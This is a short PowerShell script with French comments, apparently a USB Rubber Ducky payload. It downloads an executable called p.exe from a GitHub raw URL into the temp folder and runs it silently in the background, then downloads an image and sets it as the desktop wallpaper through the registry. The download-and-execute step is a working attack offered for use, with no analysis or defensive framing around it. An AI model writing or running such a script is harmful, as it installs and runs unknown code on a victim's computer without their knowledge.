# Définition des chemins temporaires
$tempDir = $env:TEMP
$payloadPath = "$tempDir\p.exe"
$imagePath = "$tempDir\a.jpg"

# 1. Télécharger et exécuter le payload en arrière-plan
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MeloEnPls/RubberDucky/main/p.exe" -OutFile $payloadPath
Start-Process $payloadPath

# 2. Télécharger et appliquer l'image de fond d'écran
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MeloEnPls/RubberDucky/main/a.jpg" -OutFile $imagePath
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -Value $imagePath
rundll32.exe user32.dll, UpdatePerUserSystemParameters